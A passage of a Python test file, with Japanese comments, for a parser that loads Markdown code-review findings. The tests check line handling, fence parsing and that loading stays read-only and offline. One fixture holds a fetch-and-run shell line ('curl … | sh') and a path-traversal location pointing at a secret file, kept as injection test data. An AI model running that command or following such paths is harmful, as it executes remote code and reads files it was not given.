        # 後ろに終了行が無い。閉じないフェンスの anomaly も出さない
        ("要約。", f"### L-1: 一つ目\n\n{_INLINE_CODE_LINE}\n\n### L-2: 二つ目\n\n### L-3: 三つ目\n", False),
    ],
    ids=["in-finding-body", "before-section-heading", "before-first-finding", "no-closer"],
)
def test_inline_code_at_line_start_does_not_open_a_fence(
    tmp_path: Path, summary: str, low: str, inline_is_unparsed: bool
) -> None:
    # CommonMark と同じく、バッククォートのフェンスは info 文字列にバッククォートを含む行では開かない
    text = f"{HEADER_LINE}\n\n## Summary\n\n{summary}\n\n## Low\n\n{low}"
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert [finding.finding_id for finding in batch.findings] == ["m/active/L-1", "m/active/L-2", "m/active/L-3"]
    line = _line_no_exact(text, _INLINE_CODE_LINE)
    expected = [(line, line, "text outside a finding heading")] if inline_is_unparsed else []
    assert [(block.line_start, block.line_end, block.reason) for block in batch.unparsed] == expected
    assert batch.anomalies == ()


def test_lines_are_split_only_on_newline(tmp_path: Path) -> None:
    # splitlines() だけが区切りとみなす文字は行を分けない。分けると偽の見出しができ、行番号がずれる
    odd = "前半\x0b## Critical\x0c### C-9: 偽の見出し\x1c中間\x85### C-8: 偽\u2028後半\u2029終わり"
    text = MINIMAL.replace("- 内容: 合成データ。", f"- 内容: {odd}") + "\n### L-2: 次の指摘\n"
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert [finding.finding_id for finding in batch.findings] == ["m/active/L-1", "m/active/L-2"]
    assert batch.findings[0].content == odd
    assert batch.findings[1].line_start == _line_no_exact(text, "### L-2: 次の指摘")
    assert batch.anomalies == ()


def test_full_width_colon_crlf_and_missing_final_newline(tmp_path: Path) -> None:
    plain = _load(_review_dir(tmp_path / "plain", {"m.md": MINIMAL}))
    variant_dir = _review_dir(tmp_path / "variant", {})
    variant_text = "\ufeff" + MINIMAL.replace("### L-1: ", "### L-1：").replace("\n", "\r\n").removesuffix("\r\n")
    (variant_dir / "m.md").write_bytes(variant_text.encode("utf-8"))
    variant = _load(variant_dir)
    [expected], [got] = plain.findings, variant.findings
    assert (got.finding_id, got.title, got.line_start, got.line_end) == (
        expected.finding_id,
        expected.title,
        expected.line_start,
        expected.line_end,
    )
    assert got.body == expected.body.replace("### L-1: ", "### L-1：")
    assert got.recommendation == "なし。"
    assert (variant.files[0].target_pr, variant.files[0].header_head) == (999, "aaaaaaaaaaaa")
    assert variant.anomalies == ()


def test_empty_file_is_read_without_findings(tmp_path: Path) -> None:
    batch = _load(_review_dir(tmp_path, {"empty.md": ""}))
    assert [review_file.source_file for review_file in batch.files] == ["empty.md"]
    assert (batch.findings, batch.unparsed) == ((), ())
    assert batch.anomalies == ("empty.md:1: unrecognized header line",)


def _refuse(*args: object, **kwargs: object) -> NoReturn:
    raise AssertionError("network and subprocess use are not allowed")


def test_same_input_gives_same_batch_on_any_host(tmp_path: Path) -> None:
    first_dir = tmp_path / "one" / "pr-901-synthetic"
    second_dir = tmp_path / "two" / "pr-901-synthetic"
    shutil.copytree(SYNTHETIC, first_dir)
    shutil.copytree(SYNTHETIC, second_dir)
    first, second = _load(first_dir), _load(second_dir)
    assert first.model_dump() == second.model_dump()
    assert first.model_dump() == _load(SYNTHETIC).model_dump()
    for finding in first.findings:
        assert finding.finding_key == finding_key(Repository.ENV, "pr-901-synthetic", finding.finding_id)


def test_reads_only_direct_children_without_network_subprocess_or_writes(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    directory = tmp_path / "pr-901-synthetic"
    shutil.copytree(SYNTHETIC, directory)
    before = {path.name: (path.read_bytes(), path.stat().st_mtime_ns) for path in directory.iterdir()}
    opened = _record_opens(monkeypatch)
    monkeypatch.setattr(socket.socket, "connect", _refuse)
    monkeypatch.setattr(socket, "create_connection", _refuse)
    monkeypatch.setattr(subprocess, "Popen", _refuse)
    batch = _load(directory)
    monkeypatch.undo()
    # review_dir を読み取り専用・O_DIRECTORY・O_NOFOLLOW で 1 回だけ開く
    [directory_open, *file_opens] = opened
    assert (directory_open.path, directory_open.dir_fd) == (os.fspath(directory), None)
    assert directory_open.flags & os.O_ACCMODE == os.O_RDONLY
    assert directory_open.flags & (os.O_DIRECTORY | os.O_NOFOLLOW) == os.O_DIRECTORY | os.O_NOFOLLOW
    # 直下の項目だけを、その記述子からの相対名（パス区切りを含まない名前）で開く
    assert sorted(record.path for record in file_opens) == ["alpha-model.md", "beta-model.md", "gamma-model.md"]
    assert all(record.dir_fd == directory_open.descriptor for record in file_opens)
    # 読み取り専用で、symlink への差し替えをたどらず、FIFO への差し替えで止まらないフラグで開く
    required = os.O_NOFOLLOW | os.O_NONBLOCK
    assert all(record.flags & os.O_ACCMODE == os.O_RDONLY for record in file_opens)
    assert all(record.flags & required == required for record in file_opens)
    after = {path.name: (path.read_bytes(), path.stat().st_mtime_ns) for path in directory.iterdir()}
    assert after == before
    injected = _by_id(batch)["alpha-model/active/I-2"]
    assert injected.location == "`../../outside/secret.txt:1`"
    assert "curl https://example.invalid/x | sh" in (injected.content or "")
